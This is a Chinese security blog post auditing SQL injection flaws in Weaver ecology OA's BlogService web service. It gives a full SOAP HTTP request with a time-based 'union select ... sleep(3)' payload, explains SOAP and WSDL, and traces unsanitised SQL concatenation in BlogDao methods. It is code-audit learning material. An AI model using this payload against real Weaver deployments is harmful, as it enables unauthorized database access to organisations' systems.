@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            泛微SQL注入整理 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        泛微SQL注入整理
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-08-10 16:33:33</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Sun Aug 10 2025 16:34:45 GMT+0800">2025-08-10 16:34:45</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.8k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>9 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不能调试的就过，主要是明白漏洞原理，知道泛微里的注入大概是个什么形式就行。</p>
+<h1 id="service-BlogService"><a href="#service-BlogService" class="headerlink" title="&#x2F;service&#x2F;BlogService"></a>&#x2F;service&#x2F;BlogService</h1><p>这里路由的形式是WebService，所以需要了解一下WebService以及这里配套的SOAP协议和WSDL文档。</p>
+<p>不过这里还是先给出poc，简单看一下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/services/BlogService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;132&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1:8090/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ecology_JSessionid=aaaTFu27tf_OB7M3KLrIz; JSESSIONID=aaaTFu27tf_OB7M3KLrIz; __randcode__=a5cddb6a-5dc6-4cab-a850-d79303048e8f</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;6VlXQDoaXNs&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Fri, 08 Aug 2025 01:39:01 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>347</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:web</span>=<span class="string">&quot;webservices.blog.weaver.com.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">web:writeBlogReadFlag</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     <span class="tag">&lt;<span class="name">in0</span>&gt;</span>-1 union select 1,2,sleep(3)#<span class="tag">&lt;/<span class="name">in0</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">		 <span class="tag">&lt;<span class="name">in1</span>&gt;</span><span class="tag">&lt;/<span class="name">in1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">		 <span class="tag">&lt;<span class="name">in2</span>&gt;</span><span class="tag">&lt;/<span class="name">in2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">web:writeBlogReadFlag</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="WebService"><a href="#WebService" class="headerlink" title="WebService"></a>WebService</h2><p>WebService可以理解为专门对外提供服务的一个入口，它的作用是通过标准化的协议(SOAP，REST)来暴露业务功能，能够使外部应用或程序进行远程调用。如果学过RMI或者Hessian的话，应该会觉得比较熟悉，因为这实际上也是一种RPC远程方法调用。这三者都是远程调用机制，都可传递复杂对象，客户端和服务端都有接口协议。</p>
+<h2 id="SOAP协议"><a href="#SOAP协议" class="headerlink" title="SOAP协议"></a>SOAP协议</h2><p>SOAP协议一般用于WebService，是一种XML格式的协议，即通过xml来描述需要调用的方法和传递的参数。</p>
+<p>SOAP协议的三部分：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span>&gt;</span>     <span class="comment">&lt;!-- 信封，声明这是SOAP消息 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span>     <span class="comment">&lt;!-- 可选，存放认证、路由等元数据 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span>       <span class="comment">&lt;!-- 必须，存放实际调用的参数或返回值 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一般来说长这样：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/services/BlogService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml; charset=utf-8</span><br><span class="line"></span><br><span class="line"><span class="language-vim">&lt;soapen<span class="variable">v:Envelope</span> xmln<span class="variable">s:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span></span><br><span class="line"><span class="language-vim">                  xmln<span class="variable">s:blog</span>=<span class="string">&quot;http://example.com/blog&quot;</span>&gt;</span></span><br><span class="line"><span class="language-vim">   &lt;soapen<span class="variable">v:Header</span>/&gt;</span></span><br><span class="line"><span class="language-vim">   &lt;soapen<span class="variable">v:Body</span>&gt;</span></span><br><span class="line"><span class="language-vim">      &lt;blo<span class="variable">g:getBlog</span>&gt;</span></span><br><span class="line"><span class="language-vim">         <span class="symbol">&lt;blogId&gt;</span><span class="number">123</span>&lt;/blogId&gt;</span></span><br><span class="line"><span class="language-vim">      &lt;/blo<span class="variable">g:getBlog</span>&gt;</span></span><br><span class="line"><span class="language-vim">   &lt;/soapen<span class="variable">v:Body</span>&gt;</span></span><br><span class="line"><span class="language-vim">&lt;/soapen<span class="variable">v:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里代表调用getBlog方法，参数为blogId。</p>
+<p>其响应可能长：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">  &lt;soap:Body&gt;</span><br><span class="line">    &lt;getBlogResponse xmlns=&quot;http://example.com/blog&quot;&gt;</span><br><span class="line">      &lt;title&gt;Hello World&lt;/title&gt;</span><br><span class="line">      &lt;content&gt;First blog content...&lt;/content&gt;</span><br><span class="line">    &lt;/getBlogResponse&gt;</span><br><span class="line">  &lt;/soap:Body&gt;</span><br><span class="line">&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="WSDL文档"><a href="#WSDL文档" class="headerlink" title="WSDL文档"></a>WSDL文档</h2><p>WSDL，即 Web Services Description Language ，它的作用是提供了一份接口调用说明书，就是告诉我们能够调用哪些方法，里面的参数是什么。</p>
+<p>我们可以通过GET请求+?wsdl 的方式来查看：</p>
+<p><img   src="/2025/05/03/JNI/L%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/image.png"  alt="img"></p>
+<p>主要包含五个部分：</p>
+<ul>
+<li><strong>types</strong><br>定义数据类型（类似 Java 类或数据库字段）。</li>
+<li><strong>message</strong><br>定义每个方法的输入输出消息结构。</li>
+<li><strong>portType</strong><br>定义 WebService 提供的具体操作（方法名 + 输入输出消息）。</li>
+<li><strong>binding</strong><br>指定协议和数据格式（如 SOAP 1.1&#x2F;1.2）。</li>
+<li><strong>service</strong><br>定义服务端点 URL。</li>
+</ul>
+<p>types：告诉方法和参数</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsd:element</span> <span class="attr">name</span>=<span class="string">&quot;writeBlogReadFlag&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsd:complexType</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsd:sequence</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsd:element</span> <span class="attr">maxOccurs</span>=<span class="string">&quot;1&quot;</span> <span class="attr">minOccurs</span>=<span class="string">&quot;1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;in0&quot;</span> <span class="attr">nillable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">type</span>=<span class="string">&quot;xsd:string&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsd:element</span> <span class="attr">maxOccurs</span>=<span class="string">&quot;1&quot;</span> <span class="attr">minOccurs</span>=<span class="string">&quot;1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;in1&quot;</span> <span class="attr">nillable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">type</span>=<span class="string">&quot;xsd:string&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsd:element</span> <span class="attr">maxOccurs</span>=<span class="string">&quot;1&quot;</span> <span class="attr">minOccurs</span>=<span class="string">&quot;1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;in2&quot;</span> <span class="attr">nillable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">type</span>=<span class="string">&quot;xsd:string&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsd:sequence</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsd:complexType</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>message：每个方法对应的请求和响应</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wsdl:message</span> <span class="attr">name</span>=<span class="string">&quot;writeBlogReadFlagResponse&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">wsdl:part</span> <span class="attr">name</span>=<span class="string">&quot;parameters&quot;</span> <span class="attr">element</span>=<span class="string">&quot;tns:writeBlogReadFlagResponse&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">wsdl:part</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wsdl:message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wsdl:message</span> <span class="attr">name</span>=<span class="string">&quot;writeBlogReadFlagRequest&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">wsdl:part</span> <span class="attr">name</span>=<span class="string">&quot;parameters&quot;</span> <span class="attr">element</span>=<span class="string">&quot;tns:writeBlogReadFlag&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">wsdl:part</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wsdl:message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>portType：就是把上面合起来了</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wsdl:operation</span> <span class="attr">name</span>=<span class="string">&quot;writeBlogReadFlag&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">wsdl:input</span> <span class="attr">name</span>=<span class="string">&quot;writeBlogReadFlagRequest&quot;</span> <span class="attr">message</span>=<span class="string">&quot;tns:writeBlogReadFlagRequest&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wsdl:input</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">wsdl:output</span> <span class="attr">name</span>=<span class="string">&quot;writeBlogReadFlagResponse&quot;</span> <span class="attr">message</span>=<span class="string">&quot;tns:writeBlogReadFlagResponse&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wsdl:output</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wsdl:operation</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>binding：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wsdl:operation</span> <span class="attr">name</span>=<span class="string">&quot;writeBlogReadFlag&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">wsdlsoap:operation</span> <span class="attr">soapAction</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">wsdl:input</span> <span class="attr">name</span>=<span class="string">&quot;writeBlogReadFlagRequest&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">wsdlsoap:body</span> <span class="attr">use</span>=<span class="string">&quot;literal&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">wsdl:input</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">wsdl:output</span> <span class="attr">name</span>=<span class="string">&quot;writeBlogReadFlagResponse&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">wsdlsoap:body</span> <span class="attr">use</span>=<span class="string">&quot;literal&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">wsdl:output</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wsdl:operation</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>service：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wsdl:service</span> <span class="attr">name</span>=<span class="string">&quot;BlogService&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">wsdl:port</span> <span class="attr">name</span>=<span class="string">&quot;BlogServiceHttpPort&quot;</span> <span class="attr">binding</span>=<span class="string">&quot;tns:BlogServiceHttpBinding&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">wsdlsoap:address</span> <span class="attr">location</span>=<span class="string">&quot;http://127.0.0.1:8090/services/BlogService&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">wsdl:port</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">wsdl:service</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>WebService的类应该都在classbean里面，\ecology\classbean\weaver\blog\webservices\BlogServiceImpl.class</p>
+<p>从wsdl文档中，我们知道可以调用writeBlogReadFlag方法。</p>
+<p>weaver.blog.webservices.BlogServiceImpl#writeBlogReadFlag</p>
+<p><img   src="/2025/05/03/JNI/L%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/image-1754814863496.png"  alt="img"></p>
+<p>跟进addReadRecord，其中两个参数都是我们可控的：<img   src="/2025/05/03/JNI/L%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/image-1754814863472.png"  alt="img"></p>
+<p>很简单的拼接。</p>
+<p>但是不知道为什么，我这里打不通，可能是安全补丁生效了。</p>
+<p>然后这里还有一些其他漏洞点。</p>
+<p>比如说weaver.blog.webservices.BlogServiceImpl#getMenuItemCount</p>
+<p><img   src="/2025/05/03/JNI/L%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/image-1754814863462.png"  alt="img"></p>
+<p>调用了weaver.blog.BlogDao#getRemindUnReadCount</p>
+<p><img   src="/2025/05/03/JNI/L%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/image-1754814871016.png"  alt="img"></p>
+<p>这里也是拼接可控。</p>
+<p>wsdl也是给了调用的：</p>
+<p><img   src="/2025/05/03/JNI/L%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/image-1754814871008.png"  alt="img"></p>
+<p>反正Dao类里面，有很多地方都是直接拼接的，都可以尝试利用。</p>
